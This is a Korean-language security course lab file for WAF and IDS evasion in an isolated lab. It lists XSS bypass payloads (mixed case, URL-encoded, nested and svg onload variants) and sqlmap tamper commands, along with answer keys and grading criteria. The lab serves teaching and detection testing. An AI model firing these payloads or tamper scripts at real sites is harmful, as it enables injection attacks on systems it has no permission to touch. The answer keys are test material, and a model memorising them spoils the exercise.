lab_id: standalone-attack-week10
title: IDS / WAF 우회 (Evasion) — paranoia + tamper + R/B/P
version: standalone-non-ai
course: attack
week: 10
description: |
  방어 측 detection (ModSec CRS paranoia 1 + libinjection + Suricata + Wazuh) 의
  우회 기술. 6 우회 카테고리 (encoding / case / nested / fragmentation / timing /
  protocol) + sqlmap tamper + WAF 식별. 본 환경의 paranoia 1 + libinjection 은
  표준 변형을 모두 차단하므로, 학생은 (1) 각 변형이 어떤 룰에 매치되어 차단되는지
  분석하고, (2) 우회가 성공(200)할 경우 ModSec audit log 의 사각지대(RelevantStatus
  4xx/5xx 만 기록)를 이해하고, (3) Blue (ModSec audit / Suricata / Wazuh) 의 detection
  을 cross-check 한 뒤, (4) Purple 관점에서 방어 강화 5 표준을 설계한다. 마지막 3 step
  은 R/B/P 통합. **윤리적 한계**: 6v6 환경 안에서만, 학습 목적만. 외부 시스템 우회 =
  정통망법 48조 위반.
difficulty: hard
duration_minutes: 180
audience: 사이버공격 (10주차)
prerequisites: ["W09 패스워드 공격"]
objectives:
  - "6 우회 카테고리 — encoding / case / nested / fragmentation / timing / protocol"
  - "XSS / SQLi 우회 매트릭스 + 각 변형의 매치 룰 추적"
  - "sqlmap --tamper 스크립트 + 변형 메커니즘"
  - "WAF 식별 (wafw00f 한계 + 수동 fingerprint)"
  - "Blue — ModSec audit(Serial) / Suricata eve.json / Wazuh alert cross-check"
  - "Purple — Coverage Matrix + Detection Gap + 방어 강화 5 표준"
pass_threshold: 0.6
steps:

  - order: 1
    instruction: |
      ## 🎯 MISSION (Red Team — XSS 우회 매트릭스)

      XSS payload **5 우회 변형** 을 web (10.20.30.1, Host: juice.6v6.lab) 에 보내고
      각 변형의 **응답 코드** 와 **우회 의도** 를 매트릭스로 정리하라. 각 변형이 어떤
      가정을 깨려 하는지, 그리고 현 WAF(paranoia 1 + libinjection)가 그것을 막는지
      판정한다.

      ## 💡 5 변형의 우회 의도 (학습 핵심)

      | # | payload | 우회 기법 | 깨려는 가정 |
      |---|---------|-----------|-------------|
      | 1 | `<script>alert(1)</script>` | baseline | (대조군) |
      | 2 | `<ScRiPt>alert(1)</ScRiPt>` | case mixing | regex 가 대소문자 구분한다 |
      | 3 | `%3Cscript%3Ealert(1)%3C/script%3E` | URL encoding | WAF 가 decode 전에 매칭한다 |
      | 4 | `<sc<script>ript>alert(1)</script>` | nested tag | filter 가 내부 `<script>` 만 제거한다 |
      | 5 | `<svg/onload=alert(1)>` | event handler | `<script>` 키워드만 차단한다 |

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
      ATTACK_TS=$(ssh 6v6-attacker 'date -u +%Y-%m-%dT%H:%M:%S'); echo "ATTACK_TS=$ATTACK_TS"
      ```

      ## 📋 확인 사항

      - 5 변형의 응답 코드 매트릭스 (이 환경에서는 5 변형 모두 403)
      - 각 변형이 어떤 우회 가정을 깨려 했는지 인지
      - ATTACK_TS 기록 (Blue 측 시간 상관용)

      ## 💡 왜 이걸 하는가?

      Red Team — WAF 우회 패턴 학습. 단순히 "통과/차단" 이 아니라, 각 변형이 *어떤
      방어 가정* 을 노리는지 + 현 CRS / libinjection 의 *어떤 보호* 가 효과적인지
      인지하는 것이 핵심. 모두 차단되더라도 그 자체가 "이 WAF 는 표준 변형에 견고하다"
      는 결론.

      ## 🔍 결과 해석

      - **모두 403**: paranoia 1 + libinjection 이 case/encoding/nested/event-handler
        를 모두 매치 (이 환경의 예상 결과)
      - **일부 200**: 우회 성공 후보 → STEP 5 의 audit log 사각지대 + Blue 검토 대상
      - **모두 200**: ModSec 비활성 의심 → `ssh 6v6-web 'sudo apachectl -M | grep
        security2'` 로 모듈 로드 확인

      ## ⚠️ 비정상 시 대응

      - 모두 200 — `ssh 6v6-web 'grep -rh SecRuleEngine /etc/apache2/ /etc/modsecurity/'`
        로 SecRuleEngine On 확인
      - 연결 실패 — `ssh 6v6-attacker 'curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" http://10.20.30.1/'` (정상 200 확인)
    hint: |
      XSS 5 변형 + 각 의도 + 응답 코드 매트릭스. case/encoding/nested/event-handler 의
      *깨려는 가정* 까지 인지. 이 환경에선 모두 403 — "견고한 WAF" 가 정상 결론.
    category: bypass
    points: 12
    answer: |
      ssh -n 6v6-attacker '
      for p in "<script>alert(1)</script>" "<ScRiPt>alert(1)</ScRiPt>" "%3Cscript%3Ealert(1)%3C/script%3E" "<sc<script>ript>alert(1)</script>" "<svg/onload=alert(1)>"; do
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p")
        echo "$code | $p"
      done
      '
      ATTACK_TS=$(ssh -n 6v6-attacker 'date -u +%Y-%m-%dT%H:%M:%S'); echo "ATTACK_TS=$ATTACK_TS"
    answer_detail: |
      5 변형 응답 매트릭스. 이 환경(paranoia 1 + libinjection)은 case/url-enc/nested/
      svg 를 모두 403 차단. baseline 은 941110(Script Tag), case 도 t:lowercase 로 941110,
      url-enc 는 t:urlDecodeUni 후 941110, nested 는 libinjection 토큰 분석, svg 는
      941160(event handler). 모든 변형이 949110(anomaly threshold) 초과 → 403.
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: Red — XSS 5 우회 변형 응답 매트릭스 + 각 변형 의도.
        success_criteria: ["5 변형 시도", "응답 코드", "ATTACK_TS"]
        acceptable_methods:
          - |
            **[OSS] curl 우회 매트릭스** — 표준.
              ssh 6v6-attacker 'for p in ...; do curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=$p"; done'
            예상 출력 `403 x5` (이 환경) 또는 일부 200.
            운영 해석: 각 변형이 차단되면 WAF 견고, 통과하면 우회 성공.
          - |
            **[OSS] case mixing (ScRiPt)** — regex 대소문자 우회 시도.
            예상 출력 `403` (CRS t:lowercase transform).
            운영 해석: 모던 WAF 는 lowercase 정규화 → 우회 어려움.
          - |
            **[OSS] URL encoding (%3Cscript%3E)** — decode 전 매칭 회피.
            예상 출력 `403` (CRS t:urlDecodeUni).
            운영 해석: WAF 가 decode 후 검사하면 차단.
          - |
            **[OSS] nested tag (<sc<script>ript>)** — filter 우회.
            예상 출력 `403` (libinjection 토큰 분석).
            운영 해석: libinjection 은 단순 string match 가 아닌 토큰 분석.
          - |
            **[OSS] svg / event handler (<svg/onload=>)** — script 키워드 회피.
            예상 출력 `403` (CRS 941160).
            운영 해석: 941160 은 onload/onerror 등 event handler 매치.
        negative_signs: ["변형 1~2개만", "ATTACK_TS 누락", "응답 코드 없음"]
    target_vm: attacker
    risk_level: medium

  - order: 2
    instruction: |
      ## 🎯 MISSION (Red Team — SQLi 우회 + sqlmap tamper)

      SQLi 수동 우회 변형 + **sqlmap --tamper** 3 스크립트를 web 에 시도하고, 각
      tamper 의 변형 메커니즘과 차단 결과를 정리하라.

      ## 💡 3 tamper 의 변형 메커니즘 (학습 핵심)

      | tamper | 입력 → 변형 | 우회 의도 |
      |--------|-------------|-----------|
      | `space2comment` | `UNION SELECT` → `UNION/**/SELECT` | 공백 매칭 룰 회피 |
      | `randomcase` | `SELECT` → `SeLeCt` | regex `(?i)` 누락 룰 회피 |
      | `between` | `id=1` → `id BETWEEN 0 AND 2` | `=` 키워드 매칭 회피 |

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      for tamper in space2comment randomcase between; do
        echo "=== $tamper ==="
        timeout 35 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | grep -iE "vulnerable|all tested|ending|403|forbidden" | head -4
      done
      '
      # ModSec 942(SQLi) 매치 카운트 — audit log 는 Serial 형식이라 grep 사용
      ssh 6v6-web 'sudo grep -c "id .\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
      ```

      ## 📋 확인 사항

      - 3 tamper 모두 실행 + ending 출력
      - sqlmap 의 결론 (이 환경: ModSec 가 403 차단 → "all tested ... not injectable")
      - 942 매치 카운트 증가 (tamper 시도 자체가 ModSec 패턴 매치)

      ## 💡 왜 이걸 하는가?

      sqlmap --tamper 는 WAF 우회의 표준 도구. 각 tamper 의 *변형 메커니즘* 을 인지하면
      custom tamper 작성 능력의 토대가 된다. 이 환경의 juice `/?q=` 는 SPA route 라 SQL
      endpoint 자체가 없고, ModSec + libinjection 이 강력해 모든 시도가 403 차단된다.

      ## 🔍 결과 해석

      - **403 다수 + not injectable**: ModSec 가 sqlmap 시도를 모두 차단 (예상)
      - **942 카운트 증가**: tamper payload 가 942(SQLi) 룰 매치 → audit log 기록
      - **vulnerable 발견 시**: 즉시 강사 보고 (책임 있는 공개)

      ## ⚠️ 비정상 시 대응

      - timeout 35 초과 — `--threads=1 --delay=1` 추가 또는 timeout 상향
      - 942 카운트 0 — `ssh 6v6-web 'sudo find /var/log -name "modsec_audit*"'` 로 path 확인
    hint: |
      sqlmap --tamper 3 + 각 tamper 메커니즘 + 942 grep 카운트. ModSec 차단으로
      not injectable 이 정상 결론. audit log 는 Serial 이라 jq 아닌 grep.
    category: bypass
    points: 12
    answer: |
      ssh -n 6v6-attacker '
      for tamper in space2comment randomcase between; do
        echo "=== $tamper ==="
        timeout 35 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=$tamper --headers="Host: juice.6v6.lab" --threads=1 2>&1 | grep -iE "vulnerable|all tested|ending|403|forbidden" | head -4
      done
      '
      ssh -n 6v6-web 'sudo grep -c "id .\"942" /var/log/apache2/modsec_audit.log 2>/dev/null'
    answer_detail: |
      3 tamper × sqlmap. 이 환경은 ModSec 가 sqlmap 의 모든 요청을 403 차단(76+회) →
      "all tested parameters do not appear to be injectable". SPA endpoint + libinjection.
      942 카운트는 tamper 시도가 942(SQLi) 룰 매치하며 증가. audit log 는 Serial(Native)
      format 이라 jq 가 아닌 grep 'id "942' 로 카운트.
    verify:
      type: output_contains
      expect: ending
      field: stdout
